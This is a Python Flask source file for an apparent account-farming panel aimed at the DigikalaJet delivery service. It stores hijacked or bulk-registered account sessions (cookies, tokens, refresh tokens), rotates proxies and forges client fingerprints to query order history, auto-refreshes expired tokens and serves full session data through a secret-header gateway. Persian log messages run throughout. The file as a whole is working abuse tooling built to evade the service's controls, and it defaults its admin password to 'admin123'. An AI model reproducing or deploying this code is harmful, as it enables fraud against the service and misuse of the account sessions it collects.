"""
Nexus Extractor Engine - Advanced Cloud Panel with Range & Refresh Token Checker
"""
import os, json, secrets, threading, time, uuid, urllib.parse, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template_string, render_template, jsonify, request, session, redirect, url_for, Response
import requests
import redis

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", secrets.token_hex(24))

REDIS_URL = os.environ.get("REDIS_URL", "redis://localhost:6379")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://your-domain.com").rstrip('/')
ADMIN_PASS = os.environ.get("ADMIN_PASS", "admin123")
APP_SECRET_HEADER = "JetApp-Secure-Client"

try:
    db = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    db.ping()
except Exception:
    db = None

def log_checker_event(msg):
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{now_str}] {msg}"
    if db:
        try:
            db.rpush("nexus:checker_logs", line)
            db.ltrim("nexus:checker_logs", -4000, -1)
        except Exception:
            pass

# ================= Token Worker =================
def token_worker():
    while True:
        if db:
            try:
                raw_data = db.lpop("bot:new_accounts")
                if raw_data:
                    acc = json.loads(raw_data)
                    token = secrets.token_urlsafe(14)
                    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    db.setex(f"jet_session:{token}", 30 * 24 * 3600, json.dumps(acc.get("data", {}), ensure_ascii=False))
                    
                    record = {
                        "phone": acc.get("phone", ""),
                        "name": acc.get("name", ""),
                        "token": token,
                        "created_at": now_str,
                        "total_orders": 0
                    }
                    db.hset("jet:bulk_accounts", acc.get("phone", ""), json.dumps(record, ensure_ascii=False))
            except Exception:
                pass
        time.sleep(1)

threading.Thread(target=token_worker, daemon=True).start()

# ================= Proxy & Session Parsers =================
def format_proxy(raw_p):
    raw_p = raw_p.strip()
    if not raw_p: return None
    
    scheme = "http"
    if "://" in raw_p:
        scheme, raw_p = raw_p.split("://", 1)
        scheme = scheme.lower()
        
    if "@" in raw_p:
        part1, part2 = raw_p.rsplit("@", 1)
        ip_port_pattern = r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-zA-Z0-9\.\-]+):(\d+)$'
        if re.match(ip_port_pattern, part2):
            auth_part, host_part = part1, part2
        else:
            auth_part, host_part = part2, part1
            
        if ":" in auth_part:
            u, p = auth_part.split(":", 1)
            return f"{scheme}://{urllib.parse.quote(u)}:{urllib.parse.quote(p)}@{host_part}"
        return f"{scheme}://{auth_part}@{host_part}"
        
    parts = raw_p.split(":")
    if len(parts) == 4:
        ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
        if re.match(ip_pattern, parts[0]) and parts[1].isdigit():
            ip, port, user, pwd = parts
        elif re.match(ip_pattern, parts[2]) and parts[3].isdigit():
            user, pwd, ip, port = parts
        elif parts[1].isdigit():
            ip, port, user, pwd = parts
        else:
            user, pwd, ip, port = parts
        return f"{scheme}://{urllib.parse.quote(user)}:{urllib.parse.quote(pwd)}@{ip}:{port}"
    elif len(parts) == 2:
        return f"{scheme}://{raw_p}"
    return None

def get_account_tokens(nexus_token):
    session_raw = db.get(f"jet_session:{nexus_token}")
    if not session_raw:
        return None, None
    token, refresh_token = None, None
    try:
        s_data = json.loads(session_raw)
        for c in s_data.get("cookies", []):
            if c.get("name") == "token" and c.get("value"):
                token = c.get("value")
        for orig in s_data.get("origins", []):
            for ls in orig.get("localStorage", []):
                if ls.get("name") == "persist:DKNow":
                    p_val = json.loads(ls.get("value", "{}"))
                    u_val = json.loads(p_val.get("user", "{}"))
                    if not token:
                        token = u_val.get("token")
                    refresh_token = u_val.get("refreshToken")
    except Exception:
        pass
    return token, refresh_token

def update_account_session_token(nexus_token, new_token, new_ref):
    session_raw = db.get(f"jet_session:{nexus_token}")
    if not session_raw: return
    try:
        s_data = json.loads(session_raw)
        for c in s_data.get("cookies", []):
            if c.get("name") == "token":
                c["value"] = new_token
        for orig in s_data.get("origins", []):
            for ls in orig.get("localStorage", []):
                if ls.get("name") == "persist:DKNow":
                    p_val = json.loads(ls.get("value", "{}"))
                    u_val = json.loads(p_val.get("user", "{}"))
                    u_val["token"] = new_token
                    if new_ref:
                        u_val["refreshToken"] = new_ref
                    p_val["user"] = json.dumps(u_val, ensure_ascii=False)
                    ls["value"] = json.dumps(p_val, ensure_ascii=False)
        db.setex(f"jet_session:{nexus_token}", 30 * 24 * 3600, json.dumps(s_data, ensure_ascii=False))
    except Exception:
        pass

def refresh_dk_token(token, refresh_token, proxy_url=None):
    if not refresh_token: return None, None
    url = "https://api.digikalajet.ir/user/refresh-token/?ch=jj"
    client_id = "FINGERPRINTV2-" + uuid.uuid4().hex
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Request-UUID": str(uuid.uuid4()),
        "ClientId": client_id,
        "clientid-v2": client_id,
        "ClientOs": "Android",
        "Client": "mobile",
        "platform-sso-disable-prod": "1",
        "session": "",
        "app-id": "08f293bd-0e29-4794-897c-a111b19da003",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Origin": "https://www.digikalajet.com",
        "Referer": "https://www.digikalajet.com/"
    }
    payload = {"refresh_token": refresh_token, "token": token or ""}
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    try:
        res = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=12)
        if res.status_code == 200:
            res_json = res.json()
            if res_json.get("status") == 200:
                data = res_json.get("data", {})
                return data.get("token"), data.get("refresh_token")
    except Exception:
        pass
    return None, None

def check_account_with_proxy(phone, acc_data, proxy_url=None):
    nexus_token = acc_data.get("token")
    if not nexus_token:
        log_checker_event(f"❌ شماره {phone} | خطا: توکن در دیتابیس یافت نشد.")
        return False, 0

    dk_token, refresh_token = get_account_tokens(nexus_token)
    if not dk_token and not refresh_token:
        log_checker_event(f"❌ شماره {phone} | خطا: نشست کاربر در دیتابیس موجود نیست.")
        return False, 0

    client_id = "FINGERPRINTV2-" + uuid.uuid4().hex
    session_hdr = f"{uuid.uuid4()}-V3*{int(time.time())}"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "X-Request-UUID": str(uuid.uuid4()),
        "Authorization": dk_token,
        "ClientId": client_id,
        "clientid-v2": client_id,
        "ClientOs": "Android",
        "Client": "mobile",
        "platform-sso-disable-prod": "1",
        "session": session_hdr,
        "app-id": "08f293bd-0e29-4794-897c-a111b19da003",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Origin": "https://www.digikalajet.com",
        "Referer": "https://www.digikalajet.com/"
    }
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    order_url = "https://api.digikalajet.ir/order-shipments/?ch=jj"

    need_refresh = False
    try:
        res = requests.get(order_url, headers=headers, proxies=proxies, timeout=12)
        if res.status_code == 200:
            res_json = res.json()
            api_status = res_json.get("status")
            if api_status in [401, 402]:
                need_refresh = True
            elif api_status == 200:
                data_obj = res_json.get("data") or {}
                pager_total = data_obj.get("pager", {}).get("total_items", 0)
                orders_obj = data_obj.get("orders") or {}
                ongoing = orders_obj.get("ongoing", []) if isinstance(orders_obj, dict) else []
                accomplished = orders_obj.get("accomplished", []) if isinstance(orders_obj, dict) else []
                total_orders = max(pager_total, len(ongoing) + len(accomplished))

                if total_orders > 0:
                    acc_data["total_orders"] = total_orders
                    db.hset("jet:ordered_accounts", phone, json.dumps(acc_data, ensure_ascii=False))
                    db.hdel("jet:bulk_accounts", phone)
                    log_checker_event(f"✅ شماره {phone} | تایید خرید: {total_orders} سفارش | منتقل شد به لیست دارای خرید.")
                    return True, total_orders
                else:
                    log_checker_event(f"⚪ شماره {phone} | تایید شد: بدون سفارش (خام)")
                    return False, 0
            else:
                log_checker_event(f"⚠️ شماره {phone} | پاسخ سرور با کد {api_status}: {res.text[:60]}")
                return False, 0
        elif res.status_code in [401, 402]:
            need_refresh = True
        else:
            log_checker_event(f"⚠️ خطای HTTP {res.status_code} برای شماره {phone}")
            return False, 0
    except requests.exceptions.ProxyError:
        log_checker_event(f"🚫 خطای پروکسی برای {phone} | اتصال پروکسی ناموفق بود.")
        return False, 0
    except requests.exceptions.Timeout:
        log_checker_event(f"⏱️ تایم‌اوت برای {phone} | پروکسی پاسخ نداد.")
        return False, 0
    except Exception as e:
        log_checker_event(f"❌ خطای ارتباطی برای {phone} | {str(e)[:50]}")
        return False, 0

    # Auto-Refresh if Token is Expired
    if need_refresh and refresh_token:
        log_checker_event(f"🔄 شماره {phone} | توکن منقضی بود؛ در حال تمدید خودکار توکن...")
        new_tok, new_ref = refresh_dk_token(dk_token, refresh_token, proxy_url)
        if new_tok:
            update_account_session_token(nexus_token, new_tok, new_ref)
            headers["Authorization"] = new_tok
            try:
                retry_res = requests.get(order_url, headers=headers, proxies=proxies, timeout=12)
                if retry_res.status_code == 200:
                    retry_json = retry_res.json()
                    if retry_json.get("status") == 200:
                        data_obj = retry_json.get("data") or {}
                        pager_total = data_obj.get("pager", {}).get("total_items", 0)
                        orders_obj = data_obj.get("orders") or {}
                        ongoing = orders_obj.get("ongoing", []) if isinstance(orders_obj, dict) else []
                        accomplished = orders_obj.get("accomplished", []) if isinstance(orders_obj, dict) else []
                        total_orders = max(pager_total, len(ongoing) + len(accomplished))

                        if total_orders > 0:
                            acc_data["total_orders"] = total_orders
                            db.hset("jet:ordered_accounts", phone, json.dumps(acc_data, ensure_ascii=False))
                            db.hdel("jet:bulk_accounts", phone)
                            log_checker_event(f"✅ شماره {phone} (پس از تمدید توکن) | تایید خرید: {total_orders} سفارش | منتقل شد.")
                            return True, total_orders
                        else:
                            log_checker_event(f"⚪ شماره {phone} (پس از تمدید توکن) | بدون سفارش (خام)")
                            return False, 0
            except Exception as e:
                log_checker_event(f"❌ خطا پس از تمدید برای {phone}: {str(e)[:40]}")
                return False, 0
        else:
            log_checker_event(f"❌ شماره {phone} | تمدید توکن ناموفق بود (احتمال ابطال کامل نشست).")
            return False, 0
    return False, 0

# ================= Checker Worker Thread =================
def run_cloud_checker_thread(proxy_list, start_idx=1, end_idx=0):
    db.set("nexus:checker_running", "1")
    db.set("nexus:checker_stop", "0")

    try:
        valid_proxies = [p for p in [format_proxy(x) for x in proxy_list] if p]

        accounts = db.hgetall("jet:bulk_accounts")
        if not accounts:
            msg = "⚠️ لیست خام برای بررسی خالی است."
            db.rpush("bot:admin_alerts", msg)
            log_checker_event(msg)
            return

        def get_ts(item):
            try: return json.loads(item[1]).get("created_at", "")
            except: return ""
            
        sorted_accounts = sorted(accounts.items(), key=get_ts, reverse=True)
        total_available = len(sorted_accounts)

        try: start = max(1, int(start_idx))
        except: start = 1
        try: end = int(end_idx) if end_idx and int(end_idx) > 0 else total_available
        except: end = total_available

        start = min(start, total_available)
        end = min(max(start, end), total_available)

        target_accounts = sorted_accounts[start-1 : end]
        if not target_accounts:
            msg = f"⚠️ در بازه ردیف {start} تا {end} هیچ اکانتی یافت نشد."
            db.rpush("bot:admin_alerts", msg)
            log_checker_event(msg)
            return

        p_count = len(valid_proxies)
        proxy_info = f"{p_count} پروکسی اختصاصی" if p_count > 0 else "بدون پروکسی (اتصال مستقیم)"
        start_msg = f"🔎 شروع چکر | ردیف {start} تا {end} (تعداد: {len(target_accounts)}) | {proxy_info}"
        db.rpush("bot:admin_alerts", start_msg)
        log_checker_event(start_msg)

        ordered_count = 0
        checked_count = 0
        p_idx = 0
        max_workers = min(p_count * 2, 20) if p_count > 0 else min(8, len(target_accounts) or 1)

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for phone, acc_raw in target_accounts:
                if db.get("nexus:checker_stop") == "1":
                    break
                acc_data = json.loads(acc_raw)
                chosen_proxy = valid_proxies[p_idx % p_count] if p_count > 0 else None
                p_idx += 1
                futures.append(executor.submit(check_account_with_proxy, phone, acc_data, chosen_proxy))

            for f in as_completed(futures):
                if db.get("nexus:checker_stop") == "1":
                    db.rpush("bot:admin_alerts", "⛔️ عملیات چکر با دستور کاربر متوقف شد.")
                    log_checker_event("⛔️ عملیات چکر با دستور کاربر متوقف شد.")
                    break
                checked_count += 1
                is_ordered, count = f.result()
                if is_ordered:
                    ordered_count += 1

        finish_msg = f"🎯 پایان چکر | بررسی‌شده: {checked_count} | دارای خرید: {ordered_count}"
        db.rpush("bot:admin_alerts", finish_msg)
        log_checker_event(finish_msg)
    finally:
        db.set("nexus:checker_running", "0")
        db.set("nexus:checker_stop", "0")

# ================= Web App Routes =================
LOGIN_HTML = """<!DOCTYPE html><html lang="fa" dir="rtl"><head><meta charset="UTF-8"><title>ورود | Nexus</title><script src="https://cdn.tailwindcss.com"></script></head><body class="min-h-screen bg-slate-50 flex items-center justify-center p-4"><div class="bg-white p-8 rounded-2xl border border-slate-200 shadow-xl w-full max-w-sm"><h2 class="text-xl font-bold text-slate-800 text-center mb-6">NEXUS WORKSPACE</h2><form method="POST" action="/login" class="flex flex-col gap-4"><input type="password" name="password" placeholder="رمز عبور..." required class="border border-slate-300 rounded-xl p-3 text-center outline-none focus:border-blue-500"><button type="submit" class="bg-blue-600 text-white font-bold py-3 rounded-xl hover:bg-blue-700 transition-colors">ورود به سیستم</button></form></div></body></html>"""

@app.route('/')
def index():
    if not session.get('logged_in'): return render_template_string(LOGIN_HTML)
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    if request.form.get('password') == ADMIN_PASS:
        session['logged_in'] = True
        return redirect(url_for('index'))
    return "رمز عبور نادرست است.", 401

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/api/stats')
def get_stats():
    if not session.get('logged_in') or not db:
        return jsonify({"total_accounts":0, "ordered_accounts":0, "active_proxies": None, "system_status":"Offline", "checker_running": False})
    
    total_normal = db.hlen("jet:bulk_accounts")
    total_ordered = db.hlen("jet:ordered_accounts")
    active_proxies = db.get("nexus:active_proxies")
    is_checking = db.get("nexus:checker_running") == "1"
    last_cmd = db.lindex("bot:admin_commands", -1)
    
    if is_checking: status = "Checking"
    elif last_cmd == "START_BULK": status = "Registering"
    else: status = "Standby"
    
    return jsonify({
        "total_accounts": total_normal,
        "ordered_accounts": total_ordered,
        "active_proxies": int(active_proxies) if active_proxies else None,
        "system_status": status,
        "checker_running": is_checking
    })

@app.route('/api/logs')
def get_logs():
    if not session.get('logged_in') or not db: return jsonify({"logs": []})
    raw_logs = db.lrange("bot:admin_alerts", -40, -1)
    logs_fmt = [{"timestamp": datetime.now().strftime("%H:%M:%S"), "message": l.replace('\n', ' - ')} for l in raw_logs]
    return jsonify({"logs": logs_fmt})

@app.route('/api/accounts/<acc_type>')
def get_accounts(acc_type):
    if not session.get('logged_in') or not db: return jsonify({"data": []})
    hash_key = "jet:ordered_accounts" if acc_type == 'ordered' else "jet:bulk_accounts"
    records = db.hgetall(hash_key)
    
    def get_created(item):
        try: return json.loads(item[1]).get("created_at", "")
        except: return ""
    sorted_recs = sorted(records.items(), key=get_created, reverse=True)
    
    data = []
    for idx, (phone, val) in enumerate(sorted_recs, start=1):
        acc = json.loads(val)
        data.append({
            "index": idx,
            "phone": acc.get("phone", phone),
            "name": acc.get("name", ""),
            "created_at": acc.get("created_at", ""),
            "total_orders": acc.get("total_orders", 0),
            "link": f"{WEBHOOK_URL}/auth/{acc.get('token', '')}"
        })
    return jsonify({"data": data})

@app.route('/api/custom_checker', methods=['POST'])
def start_custom_checker():
    if not session.get('logged_in') or not db: return jsonify({"error": "Unauthorized"}), 401
    if db.get("nexus:checker_running") == "1":
        return jsonify({"status": "error", "message": "چکر در حال حاضر در حال اجرا است."})

    req = request.json or {}
    proxies_text = req.get("proxies", "")
    start_idx = req.get("start_idx", 1)
    end_idx = req.get("end_idx", 0)
    
    proxy_list = [p.strip() for p in proxies_text.strip().split("\n") if p.strip()]
    threading.Thread(target=run_cloud_checker_thread, args=(proxy_list, start_idx, end_idx), daemon=True).start()
    return jsonify({"status": "ok", "message": "پردازش چکر آغاز شد."})

@app.route('/api/checker/stop', methods=['POST'])
def stop_custom_checker():
    if not session.get('logged_in') or not db: return jsonify({"error": "Unauthorized"}), 401
    db.set("nexus:checker_stop", "1")
    return jsonify({"status": "ok", "message": "فرمان توقف فوری چکر ثبت شد."})

@app.route('/api/download_checker_logs')
def download_checker_logs():
    if not session.get('logged_in') or not db: return "Unauthorized", 401
    raw_logs = db.lrange("nexus:checker_logs", 0, -1)
    content = "\n".join(raw_logs) if raw_logs else "هیچ لاگی ثبت نشده است."
    filename = f"Nexus_Checker_Logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    return Response(content, mimetype="text/plain;charset=utf-8", headers={"Content-Disposition": f"attachment;filename={filename}"})

@app.route('/api/action/<cmd>', methods=['POST'])
def handle_action(cmd):
    if not session.get('logged_in') or not db: return jsonify({"error": "Unauthorized"}), 401
    if cmd == 'start':
        db.delete("bot:admin_commands")
        db.rpush("bot:admin_commands", "START_BULK")
        return jsonify({"status": "ok", "message": "فرمان ثبت‌نام ارسال شد."})
    elif cmd == 'stop':
        db.rpush("bot:admin_commands", "STOP_EMERGENCY")
        return jsonify({"status": "ok", "message": "فرمان توقف صادر شد."})
    elif cmd == 'clean':
        req = request.json or {}
        if req.get('code') != 'NEXUS-WIPE-ALL': return jsonify({"status": "error", "message": "کد اشتباه است."})
        db.delete("jet:processed_phones", "jet:bulk_accounts", "jet:ordered_accounts", "bot:admin_alerts", "bot:new_accounts", "nexus:checker_logs")
        for key in db.keys("jet_session:*"): db.delete(key)
        return jsonify({"status": "ok", "message": "کل دیتابیس با موفقیت فلش شد."})
    return jsonify({"status": "error"})

@app.route('/api/action/delete_account', methods=['POST'])
def delete_account():
    if not session.get('logged_in') or not db: return jsonify({"status": "error"})
    phone = request.json.get('phone')
    for hash_key in ["jet:bulk_accounts", "jet:ordered_accounts"]:
        rec = db.hget(hash_key, phone)
        if rec:
            acc = json.loads(rec)
            db.delete(f"jet_session:{acc.get('token')}")
            db.hdel(hash_key, phone)
            db.srem("jet:processed_phones", phone)
    return jsonify({"status": "ok"})

@app.route('/auth/<token>')
def secure_gateway(token):
    if not db: return "Server Error", 500
    session_str = db.get(f"jet_session:{token}")
    if not session_str: return '<html dir="rtl"><body style="background:#f8fafc;color:#e11d48;font-family:Tahoma;text-align:center;padding:50px;"><h2>منقضی شده است.</h2></body></html>', 404
    u_agent, app_hdr = request.headers.get("User-Agent", ""), request.headers.get("X-Client-App", "")
    if app_hdr == APP_SECRET_HEADER or "JetAppClient" in u_agent:
        return jsonify({"status": "success", "session": json.loads(session_str)})
    return '<html dir="rtl"><body style="background:#f8fafc;color:#e11d48;font-family:Tahoma;text-align:center;padding:50px;"><h2>دسترسی مسدود است</h2></body></html>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
